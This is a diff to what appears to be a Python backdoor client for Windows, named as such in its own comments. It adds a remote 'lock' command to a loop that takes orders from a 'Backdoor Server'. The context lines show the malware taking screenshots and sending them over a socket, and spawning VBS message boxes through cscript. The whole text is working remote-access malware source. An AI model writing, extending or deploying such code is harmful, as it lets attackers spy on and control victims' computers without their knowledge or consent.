@@ -143,6 +143,9 @@ def screenshot(all_screens=True):
         sleep(1)
         send(pic.read())
 
+def lock():
+    ctypes.windll.user32.LockWorkStation()
+
 
 
 # Define `MessageBox()` Function to Show Received Message from the Server
@@ -154,6 +157,7 @@ def MessageBox(message):
     objVBS.close()
 
     subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)
+
 
 
 while True:
@@ -181,6 +185,9 @@ while True:
 
             elif strData == 'prscreen':
                 screenshot(all_screens=False)
+
+            elif strData == 'lock':
+                lock()
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
